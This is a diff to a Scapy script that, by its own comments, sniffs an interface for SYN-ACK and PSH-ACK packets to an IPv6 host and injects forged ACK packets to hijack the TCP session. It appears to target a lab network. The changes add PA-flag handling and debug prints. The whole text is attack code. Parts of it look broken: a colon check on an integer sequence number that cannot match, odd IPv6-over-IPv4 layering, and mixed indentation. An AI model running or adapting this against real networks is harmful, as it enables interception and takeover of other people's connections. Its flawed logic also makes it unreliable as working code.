@@ -2,7 +2,7 @@
 
 from scapy.all import *
 
-# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet,
+# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet and TCP pcaket with PA flag,
 # then crafts new TCP pcket with "A" flag and forwards it accordingly, in order to hijack the TCP session.
 
 # function to process the packet
@@ -11,6 +11,7 @@ def process_packet(packet):
     # Check if the packet is a TCP packet with "SA" flag
     if packet.haslayer(TCP) and packet[IPv6].dst == "2001:db8:0:1::2":
         if TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'SA':
+            print(f"Found TCP packet with SA flag")
             # Create the Ethernet layer
             eth = Ether(dst='00:0c:29:18:4c:dc', src='00:0c:29:47:e7:c0')
             # Create the IPv6 layer
@@ -29,13 +30,14 @@ def process_packet(packet):
 
             # Send the packet
             sendp(pkt, iface='ens34')
+            print(f"End of sending A flag TCP packet as reply to SA flag one")
 
-
-        # Time for "P" Flag Packet
+	# Check if the packet is a TCP packet with "PA" flag
         elif TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'PA':
+            print(f"Found TCP packet with PA flag")
             sequence_number_range = str(packet[TCP].seq)            
             if ':' in sequence_number_range:
-                # Sequence number has two parts (e.g., 1:30), grab the second part as ACK number
+                # Sequence number has two parts if you grab it from tcpdump output (e.g., 1:30), grab the second part as ACK number
                 seq_parts = sequence_number_range.split(':')
                 seq_number = int(seq_parts[1])
                 new_ack_number = seq_number
@@ -58,5 +60,5 @@ def process_packet(packet):
             pkt = eth / ipv6 / ipv4 / tcp
             # Send the packet
             sendp(pkt, iface='ens34')
-
+            print(f"End of sending A flag TCP packet as reply to PA flag one")
 sniff(iface='ens34', prn=process_packet)
